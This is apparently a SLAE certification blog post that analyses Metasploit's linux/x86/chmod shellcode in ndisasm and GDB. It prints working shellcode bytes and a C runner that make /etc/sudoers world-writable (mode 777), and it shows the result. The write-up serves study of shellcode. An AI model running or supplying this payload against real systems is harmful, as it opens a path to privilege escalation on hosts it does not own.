# SLAE #5–2: Shell-code Analysis for linux/x86/chmod
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
Student ID: SLAE-1535


# Background and tools 
Necessary background: C - Assembly - syscalls in linux
Used tools: Msfvenom - gcc - ndisasm - GDB with peda extension

In this post I'm going to present my analysis for a shell-code generated from msfvenom. For starter, to display all shell-codes for linux-x86 run the following command:
```
dipsy@kali:~$ msfvenom -l payloads | grep linux | grep x86
``` 
I'm going to analyze the following shell-code in this post.
``` 
linux/x86/chmod     Runs chmod on specified file with specified mode
``` 
Kind reminder, EAX register will hold the syscall number as well as the return value of the syscall. EBX holds the first parameter, ECX second, EDX third, ESI fourth and EDI fifth.

# Generating and dissecting the shell-code
Before generating the shell-code, lets see the basic options for this payload:
```
dipsy@kali:~$ msfvenom -p linux/x86/chmod --list-options
Options for payload/linux/x86/chmod:
=========================
Name: Linux Chmod
     Module: payload/linux/x86/chmod
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 36
       Rank: Normal
Provided by:
    kris katterjohn <katterjohn@gmail.com>
Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
FILE  /etc/shadow      yes       Filename to chmod
MODE  0666             yes       File mode (octal)
Description:
  Runs chmod on specified file with specified mode
[...]
The current setting for this payload is /etc/shadow for the FILE and 666 as the MODE. 
The following command generates a shell-code with the value /etc/sudoers as the FILE value and 777 as the mode in c formatting.
dipsy@kali:~$ msfvenom -p linux/x86/chmod FILE=/etc/sudoers MODE=777 -f c 
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 37 bytes
Final size of c file: 181 bytes
unsigned char buf[] = 
"\x99\x6a\x0f\x58\x52\xe8\x0d\x00\x00\x00\x2f\x65\x74\x63\x2f"
"\x73\x75\x64\x6f\x65\x72\x73\x00\x5b\x68\xff\x01\x00\x00\x59"
"\xcd\x80\x6a\x01\x58\xcd\x80";
``` 
To dissect the shell-code we can use ndisasm, where -u means operating in 32-bit mode. Note that there are two syscalls, 0xf and 0x1. Each of which is going to be analyzed separately in the debugging part ★. 
``` 
dipsy@ubuntu:~$ echo -ne "\x99\x6a\x0f\x58\x52\xe8\x0d\x00\x00\x00\x2f\x65\x74\x63\x2f\x73\x75\x64\x6f\x65\x72\x73\x00\x5b\x68\xff\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80"| ndisasm -u -
00000000  99                cdq
00000001  6A0F              push byte +0xf
00000003  58                pop eax
00000004  52                push edx
00000005  E80D000000        call dword 0x17
0000000A  2F                das
0000000B  657463            gs jz 0x71
0000000E  2F                das
0000000F  7375              jnc 0x86
00000011  646F              fs outsd
00000013  657273            gs jc 0x89
00000016  005B68            add [ebx+0x68],bl
00000019  FF01              inc dword [ecx]
0000001B  0000              add [eax],al
0000001D  59                pop ecx
0000001E  CD80              int 0x80
00000020  6A01              push byte +0x1
00000022  58                pop eax
00000023  CD80              int 0x80
``` 
Lets prepare our skeleton to run our shell-code.
``` 
#include<stdio.h>
#include<string.h>
unsigned char shellcode[] = 
"\x99\x6a\x0f\x58\x52\xe8\x0d\x00\x00\x00\x2f\x65\x74\x63\x2f"
"\x73\x75\x64\x6f\x65\x72\x73\x00\x5b\x68\xff\x01\x00\x00\x59"
"\xcd\x80\x6a\x01\x58\xcd\x80";
int main(){
printf("Shellcode Length:  %d\n", strlen(shellcode));
int (*ret)() = (int(*)())shellcode;
ret();
return 0;
}
``` 
Compile it:
``` 
dipsy@ubuntu:~$ gcc chmod.c -o chmod -z execstack -fno-stack-protector
``` 


# Analyzing SYS-CALLS (MOV AL, 0xf)

Lets start Debugging with GDB★
And lets hope that this post is shorter than the previous <finger crossed!>  


Running the program, setting a break-point at call EAX, which is equivalent to ret(), and run:
```
dipsy@ubuntu:~/Desktop/Assignments/Analysis$ sudo gdb ./chmod 
[sudo] password for dipsy: 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/dipsy/Desktop/Assignments/Analysis/chmod...(no debugging symbols found)...done.
gdb-peda$ disassemble main 
Dump of assembler code for function main:
   0x080483e4 <+0>: push   ebp
   0x080483e5 <+1>: mov    ebp,esp
   0x080483e7 <+3>: push   edi
   0x080483e8 <+4>: and    esp,0xfffffff0
   0x080483eb <+7>: sub    esp,0x30
   0x080483ee <+10>: mov    eax,0x804a040
   0x080483f3 <+15>: mov    DWORD PTR [esp+0x1c],0xffffffff
   0x080483fb <+23>: mov    edx,eax
   0x080483fd <+25>: mov    eax,0x0
   0x08048402 <+30>: mov    ecx,DWORD PTR [esp+0x1c]
   0x08048406 <+34>: mov    edi,edx
   0x08048408 <+36>: repnz scas al,BYTE PTR es:[edi]
   0x0804840a <+38>: mov    eax,ecx
   0x0804840c <+40>: not    eax
   0x0804840e <+42>: lea    edx,[eax-0x1]
   0x08048411 <+45>: mov    eax,0x8048510
   0x08048416 <+50>: mov    DWORD PTR [esp+0x4],edx
   0x0804841a <+54>: mov    DWORD PTR [esp],eax
   0x0804841d <+57>: call   0x8048300 <printf@plt>
   0x08048422 <+62>: mov    DWORD PTR [esp+0x2c],0x804a040
   0x0804842a <+70>: mov    eax,DWORD PTR [esp+0x2c]
   0x0804842e <+74>: call   eax
   0x08048430 <+76>: mov    eax,0x0
   0x08048435 <+81>: mov    edi,DWORD PTR [ebp-0x4]
   0x08048438 <+84>: leave  
   0x08048439 <+85>: ret    
End of assembler dump.
gdb-peda$ break *0x0804842e
Breakpoint 1 at 0x804842e
gdb-peda$ run
Shellcode Length:  7
``` 
The shell-code starts with issuing CDQ instruction. 
According to INTEL manual, The CDQ instruction extends the sign bit of AL, AX, EAX to AH,DX,EDX. 

## CDQ let EDX your wing-man
Since EAX is mostly used for SYSCALLS, and most SYSCALLS don't set the flag bit in EAX, extending the sign bit comes in handy if you want to use a register as a NULL terminator for strings or if you want to use a zeroed out register, in this case EDX will be your wing-man. 

Stepping through instructions, we find that our beloved EAX register is set to 0xf, 15 in decimal. 
We can identify the syscall using the following command: 
```
dipsy@ubuntu:~$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 15
#define __NR_chmod   15
``` 
Lets clarify what parameters need to be passed for this syscall using the manual; 
The prototype of the function is as follows:
``` 
int chmod(const char *pathname, mode_t mode);
``` 
With that in mind, EBX will contain the path-name for the file that we wish to change its permissions and ECX will hold the permissions themselves. 
Lets step into the instructions and dive in assembly world. By now, EDX has been pushed into the stack to act as a NULL terminator for the pathname. After that, JMP,CALL-POP technique is used, to push the pathname to the stack. 
``` 
[----------------------------------registers-----------------------]
EAX: 0xf 
EBX: 0xb7fc6ff4 --> 0x1a5d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a048 --> 0x652f0000 ('')
EBP: 0xbffff728 --> 0x0 
ESP: 0xbffff6e8 --> 0x0 
EIP: 0x804a045 --> 0xde8
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------]
   0x804a041 <shellcode+1>: push   0xf
   0x804a043 <shellcode+3>: pop    eax
   0x804a044 <shellcode+4>: push   edx
=> 0x804a045 <shellcode+5>: call   0x804a057 <shellcode+23>
   0x804a04a <shellcode+10>: das    
   0x804a04b <shellcode+11>: gs
   0x804a04c <shellcode+12>: je     0x804a0b1
   0x804a04e <shellcode+14>: das
Guessed arguments:
arg[0]: 0x0 
arg[1]: 0x8048430 (<main+76>: mov    eax,0x0)
[------------------------------------stack-------------------------]
0000| 0xbffff6e8 --> 0x0 
0004| 0xbffff6ec --> 0x8048430 (<main+76>: mov    eax,0x0)
0008| 0xbffff6f0 --> 0x8048510 ("Shellcode Length:  %d\n")
0012| 0xbffff6f4 --> 0x7 
0016| 0xbffff6f8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0020| 0xbffff6fc --> 0x8048461 (<__libc_csu_init+33>: lea    eax,[ebx-0xe0])
0024| 0xbffff700 --> 0xffffffff 
0028| 0xbffff704 --> 0xb7e54196 (add    ebx,0x172e5e)
[------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a045 in shellcode ()
``` 
As expected, the pathname that has been set earlier is pushed into the stack and then popped to EBX. 
``` 
[----------------------------------registers-----------------------]
EAX: 0xf 
EBX: 0xb7fc6ff4 --> 0x1a5d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a048 --> 0x652f0000 ('')
EBP: 0xbffff728 --> 0x0 
ESP: 0xbffff6e4 --> 0x804a04a ("/etc/sudoers")
EIP: 0x804a057 --> 0x1ff685b
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------]
=> 0x804a057 <shellcode+23>: pop    ebx
   0x804a058 <shellcode+24>: push   0x1ff
   0x804a05d <shellcode+29>: pop    ecx
   0x804a05e <shellcode+30>: int    0x80
[------------------------------------stack-------------------------]
0000| 0xbffff6e4 --> 0x804a04a ("/etc/sudoers")
0004| 0xbffff6e8 --> 0x0 
0008| 0xbffff6ec --> 0x8048430 (<main+76>: mov    eax,0x0)
0012| 0xbffff6f0 --> 0x8048510 ("Shellcode Length:  %d\n")
0016| 0xbffff6f4 --> 0x7 
0020| 0xbffff6f8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0024| 0xbffff6fc --> 0x8048461 (<__libc_csu_init+33>: lea    eax,[ebx-0xe0])
0028| 0xbffff700 --> 0xffffffff 
[------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a057 in shellcode ()
``` 
After that, ECX is set with the permissions that we have configure earlier, 0x1ff. 
``` 
[----------------------------------registers-----------------------]
EAX: 0xf 
EBX: 0x804a04a ("/etc/sudoers")
ECX: 0x1ff 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a048 --> 0x652f0000 ('')
EBP: 0xbffff728 --> 0x0 
ESP: 0xbffff6e8 --> 0x0 
EIP: 0x804a05e --> 0x16a80cd
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------]
   0x804a059 <shellcode+25>: inc    DWORD PTR [ecx]
   0x804a05b <shellcode+27>: add    BYTE PTR [eax],al
   0x804a05d <shellcode+29>: pop    ecx
=> 0x804a05e <shellcode+30>: int    0x80
   0x804a060 <shellcode+32>: push   0x1
   0x804a062 <shellcode+34>: pop    eax
   0x804a063 <shellcode+35>: int    0x80
   0x804a065 <shellcode+37>: add    BYTE PTR [eax],al
[------------------------------------stack-------------------------]
0000| 0xbffff6e8 --> 0x0 
0004| 0xbffff6ec --> 0x8048430 (<main+76>: mov    eax,0x0)
0008| 0xbffff6f0 --> 0x8048510 ("Shellcode Length:  %d\n")
0012| 0xbffff6f4 --> 0x7 
0016| 0xbffff6f8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0020| 0xbffff6fc --> 0x8048461 (<__libc_csu_init+33>: lea    eax,[ebx-0xe0])
0024| 0xbffff700 --> 0xffffffff 
0028| 0xbffff704 --> 0xb7e54196 (add    ebx,0x172e5e)
[------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a05e in shellcode ()
``` 
On success, the returned value of the syscall will be 0 in EAX. 
``` 
[----------------------------------registers-----------------------]
EAX: 0x0
[...]
``` 

# Analyzing SYS-CALLS (MOV EAX, 0x1)
The second SYSCALL is the exit SYSCALL which simply exits the program
```
00000059  6A01              push byte +0x1
0000005B  58                pop eax
0000005C  CD80              int 0x80
``` 

# Effect on /etc/sudoers 
Before running the shell-code, the permissions of /etc/sudoers are: 
```
dipsy@ubuntu:~$ ls -la /etc/sudoers
-r--r----- 1 root root 723 Jan 31  2012 /etc/sudoers
``` 
After running the shell-code, the permission has been set successfully. 
``` 
dipsy@ubuntu:~$ ls -la /etc/sudoers 
-rwxrwxrwx 1 root root 723 Jan 31  2012 /etc/sudoers
```

Your questions, comments are valuable and highly appreciated. Thank you for bearing to the end!
```
XOR EAX, EAX 
MOV al, 0x1 
int 0x80
```
